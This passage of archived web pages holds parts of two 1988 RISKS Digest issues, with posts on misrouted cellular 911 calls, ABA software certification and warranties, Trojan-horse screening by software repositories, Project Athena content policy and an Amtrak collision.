automated load shedding by the cellular nodes.  The problem arises when the
node nearest a caller is overloaded and a call automatically gets switched to
the next nearest node.  For example a person calling 911 in Oakville, Ont. was
redirected to St. Catharines, Ont which is about 85 km away.  There have also
been trans-border problems, a cellular call to 911 in Bowmanville, Ont was
picked up on the other side of lake Ontario in Rochester, N.Y.  I haven't seen
any documented cases of loss of life or property due to this problem but the
potential for such loss is clearly present.  Local telephone officials are
warning cellular telephone users to fully identify their location when they
make a call to the emergency number.

I conjecture that this is a symptom of a much larger problem.  The cellular
phone system is probably incapable in general of always correctly dealing with
"generic" telephone numbers (e.g. 411, 611, 555-1212, etc.) where part of the
effective telephone number is derived from the context of the caller.  Large
trans-border municipalities like Detroit Michigan/Windsor Ontario must be a
real zoo in this regard since the INWATS (800-XXX-XXXX) numbers have different
bindings in the U.S. and Canada

Dave Wortman, Computer Systems Research Institute, University of Toronto

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Software Warranties
</A>
</H3>
<address>
Robert Kennedy 
&lt;<A HREF="mailto:jrk%computer-lab.cambridge.ac.uk@NSS.Cs.Ucl.AC.UK">
jrk%computer-lab.cambridge.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Mon, 15 Feb 88 13:58:31 GMT
</i><PRE>

Nancy Leveson writes informing us of the ABA's Legal Technology Advisory
Council and their "ABA Mark of Approval" which they grant to software
passing their tests.

I am concerned that any organization which purports to do what the LTAC
does is really sticking its neck out. How can they really be sure they
have uncovered all the "serious errors" in the software they are testing?
Of course the answer is that they can't. Shouldn't they include a disclaimer
to this effect with their mark of approval?

I think it is a very good idea to have an organization like the LTAC doing
this sort of work. Someone should certainly make it their business to evaluate
software and publicize the results. But a user who naively believes approved
software to be "without serious errors" could really get burned. I have
seen software certification people find some really obscure bugs, but never
before have I heard anyone claim to find them ALL.

Of course this problem is not unique to computer software. I am sure that
somewhere out there is a person who believed Underwriters' Labs when they
were wrong (I don't know of a specific instance of their being wrong;
perhaps they never have approved a product that was dangerous...). But
we are much better at understanding the workings of electrical and mechanical
machines than we are at understanding the workings of computer software.
Furthermore, UL, as far as I know, doesn't say whether or not the products
perform as advertised. They only say whether they are safe or not.

Robert Kennedy

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Mag-stripe cards
</A>
</H3>
<address>
Joel Kirsh 
&lt;<A HREF="mailto:KIRSH@NUACC.ACNS.NWU.Edu">
KIRSH@NUACC.ACNS.NWU.Edu
</A>&gt;
</address>
<i>
Sun, 14 Feb 88 13:32 CST
</i><PRE>

When my bank card "lost its stripes" (and was subsequently munched by the
ATM) I was informed that the blame lay in the fact that I was storing it in
my wallet adjacent to another mag-stripe card.  Perhaps a subtle form of
competition between financial institutions?

Joel Kirsh, kirsh@nuacc.BITNET
                               [That is actually an attractive theory.  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Interleaving of Early Warning Systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:LIN@XX.LCS.MIT.EDU">
LIN@XX.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Fri, 12 Feb 1988  23:19 EST
</i><PRE>

    From: ronni at CCA.CCA.COM (Ronni Rosenberg)

    In RISKS 6.22, Ronald Wanttaja discusses a scenario in which "The Soviets
    blind most of the US Early Warning satellites..  The U.S. immediately goes
    to high DEFCON. ...  The Soviets do *nothing*."

    I believe that if the U.S. goes to a high DEFCON, the Soviets automatically
    go to a higher state of alert.

This statement is not supported by the historical data.  The US has placed
its strategic forces on DEFCON 3 three times, and DEFCON 2 once.  To my
knowledge, the USSR never changed the alert level of its nuclear forces.

On the other hand, the fact that it is not empirically supported does not mean
that it is not true.  It may mean that the US has never placed its forces at
sufficiently high DEFCON to do this.  DEFCON 1 has never been reached.

The real lesson is that the Sovs might react, and they might not.
You'll never know until it happens.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
What is the responsibility of Administrators?
</A>
</H3>
<address>
Chris McDonald  STEWS-SD 678-2814 
&lt;<A HREF="mailto:cmcdonal@wsmr10.ARPA">
cmcdonal@wsmr10.ARPA
</A>&gt;
</address>
<i>
Fri, 12 Feb 88 13:38:02 MST
</i><PRE>
Cc: wancho@simtel20.arpa

The latest edition of RISKS from Keith Peterson on "FLU_SHOT" as a virus
defense raises a question which I have posed to Keith and the administrator of
the simtel20 on which "FLU_SHOT" resides as a public domain program:  namely,
does an administrator of a public domain repository have any responsiblity to
examine software for the possiblity of a Trojan Horse before he or she posts
that package to their repository?  

If there are technical or administrative reasons as to why an administrator
cannot examine packages before posting them, I feel that users should be
advised in advance and up-front that this is the situation.  But I have the
impression that my opinion is a minority one.

The Army C2MUG public domain repository at Fort Leavenworth, which had 14,000
subscribers as of last Friday, apparently has a policy to screen all
software submissions before release.  C2MUG is the Command and Control
Microcomputer Users' Group.  But other well-known repositories on DDN, for
example, do not and have no official policy on notifying users of that fact.

Is there any written policy within the respective DDN, BITNET, CSNET, etc.,
communities which does address this question?

Chris McDonald, White Sands Missile Range

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Data Physician -- Correction (Re: <A HREF="/Risks/6.25.html">RISKS-6.25</A>)
</A>
</H3>
<address>

&lt;<A HREF="mailto:Andrew.Hastings@pogo.camelot.cs.cmu.edu">
Andrew.Hastings@pogo.camelot.cs.cmu.edu
</A>&gt;
</address>
<i>
&lt;lost&gt;
</i><PRE>

The phone number for Eric Hansen should have been 612-571-7400.

-Andrew Hastings	abh@cs.cmu.edu		412/268-8734

</PRE>
<A NAME="subj12"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj12.1">
Reporter seeking virus information
</A>
</H3>
<address>
John Gilmore
&lt;<A HREF="mailto:hoptoad.UUCP!gnu@cgl.ucsf.edu ">
hoptoad.UUCP!gnu@cgl.ucsf.edu 
</A>&gt;
</address>
<i>
Sun, 14 Feb 88 05:28:14 PST
</i><PRE>

[Relayed from the FidoNews 5-06 of 8 Feb 1988]

                             -- VIRUS QUERY --

Reporter writing an article for the NY Times on the threat of "virus' ("mole,)
"worm" and/or trojan horse "attack code" programs seeks reports of real
experiences with these often destructive, sometimes playful, devices.  I'm
interested in any reports about incidents involving PCs, minis or micros.

Please forward replies to Vin McLellan at Fido 101/154, (voice) 617-426-2487,
or Snail: 125 Kingston St., Boston, Ma. 02111.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.26.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.28.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-64</DOCNO>
<DOCOLDNO>IA012-000130-B024-266</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.28.html 128.240.150.127 19970217015653 text/html 26554
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:55:16 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 28</TITLE>
<LINK REL="Prev" HREF="/Risks/6.27.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.29.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.27.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.29.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 28</H1>
<H2> Wednesday 17 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Interleaved Alert Systems 
</A>
<DD>
<A HREF="#subj1.1">
Earl Boebert
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Unix Review -- Safe and Secure 
</A>
<DD>
<A HREF="#subj2.1">
Aaron Schuman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: More info on Compuserve Macinvirus 
</A>
<DD>
<A HREF="#subj3.1">
Amos Shapir
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  More on LTAC -- software review and warranties 
</A>
<DD>
<A HREF="#subj4.1">
Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Software Warranties 
</A>
<DD>
<A HREF="#subj5.1">
Barry Nelson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Computer Pornography 
</A>
<DD>
<A HREF="#subj6.1">
Joe Morris
</A><br>
<A HREF="#subj6.2">
 Jay Elinsky
</A><br>
<A HREF="#subj6.3">
 Jim Frost
</A><br>
<A HREF="#subj6.4">
 Don Mac Phee
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  A bit more on the AMTRAK crash... 
</A>
<DD>
<A HREF="#subj7.1">
John McMahon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Last Clasp credit cards 
</A>
<DD>
<A HREF="#subj8.1">
Jack Holleran
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  911 
</A>
<DD>
<A HREF="#subj9.1">
Brint Cooper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Talk on Legal Issues of Computer Graphics by Susan Nycum 
</A>
<DD>
<A HREF="#subj10.1">
Eugene N. Miya
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 Interleaved Alert Systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:Boebert@DOCKMASTER.ARPA">
Boebert@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 17 Feb 88 10:05 EST
</i><PRE>

Barbara Tuchman, in her classic _The Guns of August_, makes a strong case
that WWI started because of interleaved alert systems.  The issue then was
mobilization time in days versus flight time in minutes, but the positive
feedback effect was the same.  Worth reading by anybody interested in
interactions among large systems.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
The Latest Unix Review
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Wed, 17 Feb 88 17:05:08 -0800
From: Aaron Schuman &lt;human%hpinddf@hplabs.HP.COM&gt;
Cc: human%hpinddf@hplabs.HP.COM

The Feb '88 issue of Unix Review (vol 6, #2) takes "Safe and Secure" as its
theme.  I found it to be worthwhile reading.  Especially useful were Tom
Berson's interview with Colonel Roger Schell and an article on cost
considerations of security by Gligor &amp; Chandersekaran.  If you've got an
hour, go find yourself a copy.  Happy reading.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: More info on Compuserve Macinvirus (RISKS DIGEST 6.27)
</A>
</H3>
<address>
Amos Shapir NSTA 
&lt;<A HREF="mailto:amos@nsc.NSC.COM">
amos@nsc.NSC.COM
</A>&gt;
</address>
<i>
Wed, 17 Feb 88 09:07:01 PST
</i><PRE>

Flames aside, there is one good outcome of Richard Brandow's message: On
March 2, any MacII user who assumes (as the Chicago Tribune reporter did)
that viruses were just an urban legend, will learn otherwise in an easy
way, and take appropriate steps to protect his Mac.

	Amos Shapir				
National Semiconductor 7C/266  1135 Kern st. Sunnyvale (408) 721-8161
amos@nsc.com till March 1, 88; Then back to amos%taux01@nsc.com 

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
More on LTAC -- software review and warranties       [Re: <A HREF="/Risks/6.22.html">RISKS-6.22</A>]
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Reply-To: nancy@ICS.UCI.EDU
Date: Wed, 17 Feb 88 10:03:27 -0800
From: Nancy Leveson &lt;nancy@commerce.UCI.EDU&gt;
                        [Note: LTAC = Legal Technology Advisory Council.  PGN]

I have some additional information, which judging from the response I got to 
my message, may be of interest to enough people to warrant putting it in Risks.

Apparently, there are committees like the IEEE Working Groups that LTAC has
formed to develop a draft of the guidelines or criteria on which the software
will be evaluated.  These working groups include representatives from all
interested parties, including those who build and sell the software.  The
guidelines are developed by a concensus process -- there is no majority vote.
The criteria are discussed until all agree.  The guidelines statement is then 
sent to companies who sell that particular type of software.

If a company submits their software to be tested, they receive an
exception letter which states where the software does not meet the criteria.
This letter provides enough information so that the vendor can replicate the
erroneous behavior. The software must satisfy all the mandatory criteria.
There are also some preferred criteria which specify additional features
that would be nice to include in such software.  LTAC has two categories:
Standard means that one half the preferred criteria are included and
Advanced means that two thirds of the preferred criteria are included.  The
vendor is given a chance to fix any of the problems mentioned in the exception
letter.  The same tests are used for each of the software packages of a 
certain type, e.g., all docketing programs are submitted to the same set of 
test cases. (I assume that additional test cases are written for special
claims by the vendor).  

The reviews provided for each approved software package are extensive and do 
not just say "yes" or "no."  They are 30-60 pages long and describe the
features of the software and the detailed results of the testing process.  
The review is sent to the vendor first to get their comments.  If there are 
errors in the review and the vendor does not point this out and later 
discovers them, then the vendor must pay for reprinting the review.

A previous Risks message mentioned the problem of the cost of the review.  It 
IS expensive.  For example, a single-user Time, Accounting, and Billing system
will cost the vendor $27,000 to go through the review process.  On the other
hand, it seems like vendors could get the published guidelines and provide
a warranty themselves if they wanted to -- I am sure that would satisfy their
customers and also save them the money.  The cost of LTAC is not covered by
the charges, by the way.  Over the three years of existence, the ABA has 
contributed over $1,000,000 to LTAC.  So LTAC is not only non-profit, it is
operating at a deficit.  One should note that the cost of getting a UL rating 
is many times greater than the cost of getting the ABA software approval.

I do not believe that an LTAC-type operation will solve all our problems with
software.  But it is an interesting phenomenon to watch the purchasers get
together and demand that vendors are truthful and accept responsibility for 
their products and their claims about their products when government is not
taking adequate steps to protect them.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
RE: Software Warranties
</A>
</H3>
<address>
Barry Nelson 
&lt;<A HREF="mailto:bnelson@ccb.bbn.com">
bnelson@ccb.bbn.com
</A>&gt;
</address>
<i>
Wed, 17 Feb 88 10:17:53 EST
</i><PRE>

RE: RISKS 6.27 Robert Kennedy &lt;jrk%computer-lab.cambridge.ac.uk@NSS.Cs.Ucl.AC.UK&gt;

&gt;&gt; Furthermore, UL, as far as I know, doesn't say whether or not the products
&gt;&gt; perform as advertised. They only say whether they are safe or not.

Not  even  that!   They  license  you  to  mark  your units as having met their
*minimum* safety standards, as inspected by their engineers. They do not  claim
it's  safe  or that they have looked at everything, or that they have written a
perfect standard.  They will not tell you how to make it safer, only whether or
not it meets their interpretation of a given paragraph in a standard.

From  my readings of Product Liability Cases, it appears that a manufacturer is
often held strictly liable for damage or injuries which occurred as a result of
the  product  *regardless*  of  it's  adherence  to  safety  standards.  Safety
certification efforts by the vendor *DO* help disprove negligence.

Note that UL (et al) assumes *no* liability for your product or its use. If you
invoke  their  mantle during litigation, they may start their own investigation
of the incident and issue an affadavit as to any deviations found in the  unit.
This  is tantamount to an indictment, should *anything* be found and places the
onus clearly on the defendant to now prove irrelevance of each  defect  to  the
claimed injury.  (Talk about a two-edged sword!)

The  point  is: you cannot hide behind someone else's evaluation if you are the
product experts or could have hired one.  UL does not claim to be expert,  only
an  inspector and promulgator of Standards.  The same would probably hold for a
software test agency.  It establishes a minimum acceptance, not a quality goal.

Barry C. Nelson /Senior Systems Engineer /
BBN Communications Corporation / 70 Fawcett Street, Cambridge, MA 

"This document contains statements of opinion by the author that are not
 attributable to BBN Communications Corporation or its management."

                          [Some of this was also noted in a contemporaneous
                          message from Ronni Rosenberg.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Computer Pornography (revisited)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Wed, 17 Feb 88 17:20:40 EST
From: Joe Morris (jcmorris@mitre.arpa)
Organization: The MITRE Corp., Washington, D.C.

In RISKS 6:27, Jonathan Kamens asks:

&gt; [...]Can the administration of a supposedly user-privacy-secure system
&gt; censor the material that is made accessible on it?  Is the presence of 
&gt; a filesystem on a machine evidence that the administration "supports"
&gt; the contents of the filesystem?

The answers are, I suggest, "yes" and "it depends".  In general, the
owner/operator/manager of a computer system has the legal authority to say what
can be done with it, and has the legal responsibility to reject unlawful
activities where it is aware of them.  (There is, of course, a gray area in
deciding how much effort must be expended in discovering whether there are any
such unlawful uses being made of the system.)

For example, if the operator of a BBS is aware that a certain message contains
pirated credit card numbers and does not remove the it from the system, then
the damaged parties (the credit card holder and/or the issuer) probably have a
right of action.  If it is not reasonable to expect the operator to screen the
messages (Compuserve for example) then there should be no right of action as
long as the operator has not been made aware of the improper use.  From a legal
standpoint I doubt that there is any significance in the question of whether
the data was in a private or public file.  Once the nature of the material is
known the operator may be required to act.

Even if the material is not unlawful, the operator of the computer system still
has every right to establish policy governing how that system is to be used.
If a user doesn't like the policy an attempt can be made to change it, but
that's all.  Even if the material isn't illegal, management has a valid concern
for public relations which isn't helped by allowing the facility to become
known as a repository for feelthy peechurs.  It's like a newspaper, where the
policy is set by the publisher.  If the editor doesn't like it, tough.  In the
case cited in the RISKS entry the Project Athena management was apparently
responding to negative publicity which could damage its reputation with
individuals who are in a position to affect its business.

There doesn't even have to be the extreme of "dirty" material.  If the system
management wants to declare that game programs are not to be placed on the
system, that's their prerogative.  If you insist on playing Adventure on the
system, you're not welcome.

A final note: there is a difference between the legal authority to set policy
for a system and the ethical exercise of that right.  The recent Supreme Court
decision on the Hazelwood student newspaper is a case in point: however
ill-considered the specific decision may have been, the school as publisher had
the final say on the contents of the paper.
                                                      Joe Morris

</PRE>
<HR><H3><A NAME="subj6.2">
Computer pornography on Project Athena system
</A>
</H3>
<address>
Jay Elinsky 
&lt;<A HREF="mailto:ELINSKY@ibm.com">
ELINSKY@ibm.com
</A>&gt;
</address>
<i>
17 Feb 88 13:05:00 EST
</i><PRE>

Maybe Project Athena lets you use their resources for any purpose you want.
Here in the corporate world, we're allowed to use company resources only for
company business.  Not that my manager can go snooping into my files (he
can't, except under certain exceptional conditions).  But if there's a disk
space shortage then I could be asked to justify the space I'm consuming.  If
I honestly say that I'm storing dirty pictures, then I'll be told that it's
not a legitimate business use of the system.  If I lie, then I deserve to be
disciplined.

Jay Elinsky, IBM T.J. Watson Research Center, Yorktown Heights, NY

</PRE>
<HR><H3><A NAME="subj6.3">
RISKS in using public computers -- computer pornography [<A HREF="/Risks/6.27.html">RISKS-6.27</A>] 
</A>
</H3>
<address>
Jim Frost
&lt;<A HREF="mailto:madd@bu-cs.bu.edu ">
madd@bu-cs.bu.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 18 Feb 88 00:05:42 GMT 
Organization: Boston University Distributed Systems Group

This isn't specifically about the xpix incident, but deals with a very
relevant RISK.  Many users of "public" computer systems (e.g., a university
mainframe) are unaware of policies governing the use of the
hardware/software.  On our systems at Boston University, anything created on
any university-owned mainframe is basically the property of Boston
University (there are possible exceptions but they aren't the subject at
hand).  This means that if a student created a nifty program, s/he would be
unable to copyright that program independently of the university.  Now, the
RISK of this is that the university doesn't make this publicly known (I
found out about it after one of my programs turned out to be valuable -- I
didn't want to sell it but several people commented that the copyright
notice I put on it was invalid).

From the university's point of view (and probably that of MIT with regards to
Athena), they own the system and thus can dictate the use of its resources.
If they don't like something, they reserve the right to destroy it/alter
it/sell it/whatever.  If that is the policy with Athena, an independent user
making his files world-readable could just be shut down by the system manager.

With regards to copyrights, is it really legal for a university (or other
entity) to claim copyright to anything made on their system without the
writer's specific permission (eg signing a paper saying that anything done on
a company's system is the property of the company unless the company releases
it)?  I would liken the source on the machine to typing on a piece of paper.
The way something is expressed on the paper should be the property of the
person that expresses it, not that of the owner of the paper (in the mind of
this programmer, at least), which is what I thought was the idea behind the
copyright law.  This would seem to follow the common practice, too, since
people buy programs, music, books, etc but the writer maintains ownership of
the expression although the buyer owns the medium.

Food for thought.          jim frost           madd@bu-it.bu.edu

</PRE>
<HR><H3><A NAME="subj6.4">
A bit more on the AMTRAK crash...
</A>
</H3>
<address>
x4333)
&lt;<A HREF="mailto:XRJJM%SCINT.SPAN@STAR.STANFORD.EDU (John McMahon, STX/COBE ">
XRJJM%SCINT.SPAN@STAR.STANFORD.EDU (John McMahon, STX/COBE 
</A>&gt;
</address>
<i>
Wed 17 Feb 88 08:23:08-PDT
</i><PRE>

***&gt; From: msb@sq.com (Mark Brader)
***&gt; &gt; The FCC's private radio bureau reported [of the Chase, MD, accident]
***&gt; &gt; that "This terrible collision could have been avoided had the
***&gt; &gt; locomotives been under the control of a central computer."
***&gt; It could also have been avoided if the turnout in question had had
***&gt; a "derail".  This device, as the name suggests, would derail one train --
***&gt; in this case, the locomotives -- rather than letting it onto the through
***&gt; line where it could (and did) collide with,

Mark brings up a valid point.  Unfortunately, that section of track (Just south
of the Gunpowder River bridges) has no derails.  I haven't been on that section
of track, but the layout diagrams I have seen never mentioned a derail.

As I recall (since the docs are not in front of me) the track looks like this:

                                              Gunpow Bridge
        &lt;------------A----------------*-C-----------------------&gt;
To Washington                        /                          To New York
        &lt;------------B--------------/

The Conrail train, on track B, had ignored at least one warning signal.  It
ended up going through a stop signal right before it reached the switch.  The
Engineer hit the brakes as the train went through the switch, and ultimately
stopped at point C.

At the same time, the AMTRAK train had been approaching the same point on
track A.  It's reported speed was around 100 MPH.  On some sections
of AMTRAK's Northeast corridor, 125 MPH is the speed limit.  There has been
some question as to how wise it is to run trains so fast, when only some of
them are under Automatic Train Control (ATC).  All AMTRAK trains in the area
are under ATC, the CONRAIL trains aren't.

Since the CONRAIL train couldn't outrun the AMTRAK, and they couldn't back up
(An article in the Washintonian Magazine suggested the engineer of the CONRAIL
train considered backing up until the AMTRAK came into view) Impact occurred.

A derail switch would have (probably) saved the AMTRAK train.

                                              Gunpow Bridge
        &lt;------------A----------------*------------------------&gt;
To Washington                        /                          To New York
        &lt;------------B--------------*--D--!

If the derail was installed (Track D) the CONRAIL train would have passed the
STOP signal and instead of being forced onto track A would proceed on to
track D.  The AMTRAK train may have shot by without even knowing there
was a problem.

The risk here is that the CONRAIL locomotive still would have crashed, the
lives of the CONRAIL train crew would be threatened, and if the crash was bad
enough it could still spill back onto the "A" track.  It seems forcing CONRAIL
into using ATC would be a better idea.

John McMahon

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Re: Last Clasp credit cards
</A>
</H3>
<address>
Jack Holleran 
&lt;<A HREF="mailto:Holleran@DOCKMASTER.ARPA">
Holleran@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 17 Feb 88 00:19 EST
</i><PRE>

I don't think that the magnetic clasps on purses could degauss or fully 
erase credit cards.  The magnets may introduce some noise on the magnetic
stripe but it should still be legible electronically.

First, you need a sufficient strength to really erase.  How much is
enough?  You have to exceed the coercivity of the magnetic stripe on
the card.  Most of the cards are using a quality magnetic stripe to 
prevent overwriting by the criminal element.

Second, why would the purse manufacturer use a "high coercivity" magnet 
to keep the purse closed.  He is probably going to use the cheapest
magnet he can find to do the job.  If its too expensive, he'll figure a
way to bring back snaps.

I think the damage is probably being done in the stores where everyone
seems to have an on-line reader.  No offense to the hard working clerks
but have you really watched how they "read" a card on the reader.  How often
have they had to reread the card and then, "punch" the numbers into the
reader or cash register or call the credit card service bureau.  The card
could be bad but the reader might be "dirty" or the clerk could be "reading"
the card wrong.

Concerning the eelskin metalic particles introduced in the tanning process
(<A HREF="/Risks/6.25.html">RISKS-6.25</A>), the stripe on the credit card is a modified magnet.  It will when
placed near particles which could be magnetized, attract them.  The particles
could then "dirty" the reader.  Which in turn "dirties" another card.  Since
some of the other conversations in RISKS have been about viruses, this might be
a description of a "particle virus".

Jack Holleran

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 911
</A>
</H3>
<address>
    Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.ARPA">
abc@BRL.ARPA
</A>&gt;
</address>
<i>
Tue, 16 Feb 88 22:22:12 EST
</i><PRE>

&gt; Several cases have been reported here recently in which calls from cellular
&gt; telephones to the 911 emergency number have been seriously misdirected due to
&gt; automated load shedding by the cellular nodes.  The problem arises when the
&gt; node nearest a caller is overloaded and a call automatically gets switched to
&gt; the next nearest node.  For example a person calling 911 in Oakville, Ont. 
&gt; was redirected to St. Catharines, Ont which is about 85 km away. 

	A low-tech, non-computer solution is easily available.  The 911 (or
police, fire, ambulance, whatever) dispatchers in adjacent jurisdictions simply
monitor one another's radio transmissions.  While this is technically in
violation of FCC rules, the Commission knows it is done and condones it in the
interests of life and safety.  For example, state and local police here have,
in earlier days, monitored one another's transmissions to coordinate problems
as have fire departments in adjacent jurisdictions.
                                                               Brint

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
2/23 8 PM Bay Area ACM/SIGGRAPH: Legal Issues of Computer Graphics
</A>
</H3>
<address>
Eugene N. Miya 
&lt;<A HREF="mailto:eugene@ames-pioneer.arpa">
eugene@ames-pioneer.arpa
</A>&gt;
</address>
<i>
Wed, 17 Feb 88 17:23:08 pst
</i><PRE>

Legal Issues of Computer Graphics
Susan Hubbell Nycum

Date: February 23, Tuesday (4th Tuesday of the Month)
Time: 8 PM
Location: Xerox Palo Alto Research Center (PARC), 3333 Coyote Hill Road

Bay Area ACM/SIGGRAPH
Association for Computing Machinery
Special Interest Group on Computer Graphics

Ms. Nycum will speak on the legal issues involving computer graphics.  The
focus will be on proprietary protection including the recent developments
in copyright for screen displays and patents for user interfaces.

(Ms. Nycum is a partner of the international law firm of Baker and McKenzie
resident in the Palo Alto Office, specializing in the legal aspects of high
technology including computers and communications -- proprietary-rights,
licensing technology transfer, governmental regulation, privacy, computer
crime, licensing, litigation and general advice to high technology
companies and organizations using high technology products and services.)

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.27.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.29.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
